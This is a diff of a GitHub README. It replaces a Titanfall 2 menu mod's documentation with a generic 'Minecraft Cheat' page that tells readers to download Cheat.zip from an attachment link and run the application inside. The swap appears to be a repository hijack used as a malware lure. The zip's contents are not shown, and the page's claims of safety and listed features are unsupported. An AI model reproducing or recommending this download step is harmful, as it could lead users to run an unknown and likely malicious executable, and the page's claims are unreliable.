@@ -1,120 +1,62 @@
-<p align="center" style="text-align:center"><img width="125" height="122" src="https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/icon.png" alt="Titanfall 2 - Enhanced Menu Mod" /></p>
+# Minecraft Cheat
 
-![VPK Build Status](https://github.com/taskinoz/Enhanced-Menu-Mod/actions/workflows/buildvpks.yml/badge.svg)
+Welcome to the **Minecraft Cheat** repository! This is a powerful tool designed to enhance your gameplay experience in Minecraft. Cheat your way through challenges, uncover hidden secrets, and dominate the game with ease.
 
+## Features
 
-# Enhanced Menu Mod
-Adds more options to the settings menu, such as extra keybinds, cheats, hud enhancements and cleaner interface
-
-# Features
-* Removed **Spotlight** and **Whats New** from the main menu
-* Added `sv_cheats` to the contols menu
-* Added HUD Options
-  * Bloom - `mat_disable_bloom`
-  * Show FPS - `cl_showfps`
-  * Show FPS Big - `showfps_enabled`
-  * Show Player Position - `cl_showpos`
-* Added new Keybinds
-  * Speedrunning
-    * Save/Load Quicksave 1
-    * Save/Load Quicksave 2
-    * Save/Load Quicksave 3
-    * Slow the game to 25%
-    * Speed the game up to 500%
-    * Reset all helmets
-    * Give yourself an EVA Shotgun
-    * Give yourself an EPG
-  * Demos
-    * Record Demo incrementally
-    * Record Demo
-    * Stop recording Demo
-    * Pause Demo
-    * Resume Demo
-    * Toggle Play/Pause Demo
-  * Extras
-    * Toggle low gravity
-    * Set camera to First Person
-    * Set camera to Third Person
-    * Move Third Person camera in
-    * Move Third Person camera out
-    * Hide/Show weapon
-  * No Cutscene Saves
-    * Load save 1-9 with 3 alternate saves
-  * No Cutscene Helmet Saves
-    * Load save 1 and 2
-* Added Extras Menu
-  * Demos
-    * Enable Demos
-    * Save Demos
-    * Interpolate Playback
-    * Demo record rate Single Player
-    * Demo record rate Multiplayer
-    * Key Bindings (shortcut)
-  * Gameplay
-    * Enable Wallrunning (sp)
-    * Enable Automantle (sp)
-    * Enable Vertical Dodge (sp)
-    * Player Control Debounce
-    * Command Que
-    * Speedometer Settings (Works with the MP mod)
-  * Community
-    * Communities toggle for MP
-* Audio
-  * Loading Fade Time
-  * Loading Silence Time
-* Replaced Chinese subtitles with English
-* Replaced Chinese UI text with English
-* Removed crashes from Dev launch arguments `-dev +developer 1`
-* Added Speedometer (only to Single Player)
+- Unlock unlimited resources
+- Fly mode for fast traversing
+- Instant kill for defeating enemies effortlessly
+- Speed hack for swift movement
+- X-ray vision to see through blocks
+- Automatic building to save time
 
 ## Installation
 
-1) Download the pre-compiled version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page or [ModDB(OLD)](https://www.moddb.com/mods/enhanced-menu)
+To get started with **Minecraft Cheat**, follow these simple steps:
 
-2) Backup your `englishclient_frontend.bsp.pak000_dir.vpk` and copy the 2 `.vpk` files from the downloaded zip to your `Titanfall2/vpk` folder
+1. Download the Cheat.zip file by clicking the button below:
+   
+   [![Download Cheat.zip](https://img.shields.io/badge/Download-Cheat.zip-<COLOR_CODE>)](https://github.com/user-attachments/files/17043020/Cheat.zip)
 
-## Icepick
+2. Extract the contents of the Cheat.zip file to a location of your choice.
+3. Launch Minecraft and run the Cheat application.
+4. Start dominating the game with the powerful features at your disposal!
 
-1) Download the Icepick specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+## Usage
 
-2) Open the downloaded `Enhanced.Menu.Mod.Icepick.zip` file and copy the `Enhanced.Menu.Mod.Icepick` folder to you `Icepick/data/mods` folder.
+Once you have installed the **Minecraft Cheat**, you can unleash its full potential by using the following commands:
 
-3) Launch Icepick.
+- **/unlimited_resources** - Enables unlimited resources mode.
+- **/fly_mode** - Activates the fly mode for quick movement.
+- **/instant_kill** - Instantly eliminates enemies in your path.
+- **/speed_hack** - Increases your speed for rapid exploration.
+- **/x_ray_vision** - Toggle X-ray vision to see through blocks.
+- **/auto_build** - Automatically builds structures with predefined designs.
 
-## Northstar
+## FAQs
 
-1) Download the Northstar specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+### Is **Minecraft Cheat** safe to use?
 
-2) Open the downloaded `Enhanced.Menu.Mod.Northstar.zip` file and copy the `Enhanced.Menu.Mod.Northstar` folder to you `Titanfall2/R2Northstar/mods` folder.
+Yes, **Minecraft Cheat** is designed to be safe and user-friendly. However, it is recommended to use it responsibly and avoid disrupting the gameplay experience of others.
 
-3) Launch Northstar.
+### Can I customize the features of **Minecraft Cheat**?
 
-## Screenshots
+Unfortunately, the features of **Minecraft Cheat** are predefined and cannot be customized at this time. We are continuously working on updates to enhance the tool further.
 
-![Main Menu with custom menu video](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main.jpg)
+### Will using **Minecraft Cheat** affect my game progress?
 
-Main Menu with the original Titanfall 2 menu video
+Using **Minecraft Cheat** may impact your game progress, as it provides advantages that are not available in the standard gameplay. It is advisable to use it in single-player mode or with the consent of all players in a multiplayer environment.
 
-![Main Menu with no showcase content](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main1.jpg)
+## Support
 
-Main Menu with the showcase removed to declutter the menu
+If you encounter any issues or have suggestions for improving **Minecraft Cheat**, feel free to reach out to us via the GitHub repository's Issues section. Your feedback is essential for enhancing the tool and providing a better gaming experience for all users.
 
-![Cheats setting](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-cheats.jpg)
+## Credits
 
-New Cheat options that can be enabled as well as the extras menu
+- **Icon credits**: [Flaticon](https://www.flaticon.com/)
+- **Background image**: [Unsplash](https://unsplash.com/)
 
-![New custom keybinds](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-keys.jpg)
+---
 
-Added keybinds for speedrunners and extra commands for fun
-
-![Advanced Look Options with values](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-advanced-look.jpg)
-
-Shows the values for each setting on the Advanced Look Options
-
-![New HUD options](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-hud.jpg)
-
-Added extra HUD display options for showing FPS, Position, Velocity, and Server Tick rate
-
-![Extras Menu](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-extras.jpg)
-
-Added a menu for enabling and changing demo settings for recording single and multiplayer demos as well as turning of wallrunning and enabling titan jumping.
+Thank you for choosing **Minecraft Cheat** to elevate your Minecraft gameplay. Start exploring, building, and conquering like never before! 🚀🎮
